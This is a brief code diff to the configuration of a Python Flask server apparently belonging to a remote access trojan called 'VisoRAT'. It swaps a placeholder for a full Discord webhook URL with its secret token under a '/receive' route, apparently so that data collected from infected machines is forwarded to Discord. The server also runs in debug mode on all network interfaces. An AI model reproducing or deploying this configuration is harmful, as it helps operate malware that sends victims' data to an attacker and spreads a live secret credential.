@@ -26,7 +26,7 @@ def load_config():
                 "/receive": {
                     "webhooks": [
                         {
-                            "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+                            "url": "https://discord.com/api/webhooks/1467586176213979206/tGgCIwawLGEoQeEE0e48FMXF25OdLQ3S2ZgXlppyy-GDQHpXhVX07X352pT6ZMxLCiNG",
                             "name": "VisoRAT",
                             "footer": "VisoRAT",
                             "color": 7414964,
@@ -272,3 +272,4 @@ if __name__ == '__main__':
     
 
     app.run(host='0.0.0.0', port=5000, debug=True)
+
